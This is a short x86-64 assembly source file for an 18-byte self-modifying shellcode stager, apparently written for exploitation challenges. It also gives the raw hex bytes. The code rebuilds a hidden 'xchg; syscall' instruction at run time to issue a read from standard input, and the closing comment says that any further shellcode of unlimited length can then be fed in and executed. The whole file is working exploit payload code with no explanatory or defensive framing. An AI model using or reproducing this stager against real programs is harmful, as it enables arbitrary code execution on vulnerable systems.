;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
[BITS 64]

[SECTION .AAA EXEC WRITE]	; do not name this section ".TEXT", otherwise 
							; 'ld' will mark this section READONLY
	global _start

_start:
	; lea rax, [REL _begin]	; now rax points to _begin

_begin:
	sub edx, edx
	mov edi, edx
	mov esi, edx
	mov dl, _neg - _begin
	shl dword [rax+rdx], 1
	mov dl, 31
	nop
_neg:
	dd 0x050f9648 / 2	
	; xchg rsi, rax		; 48 96
	; syscall			; 0f 05

; only 18 bytes:
; \x29\xd2\x89\xd7\x89\xd6\xb2\x0e\xd1\x24\x10\xb2\x1f\x90\x24\xcb\x87\x02

; now you can input another shellcode(without limit) to excute.
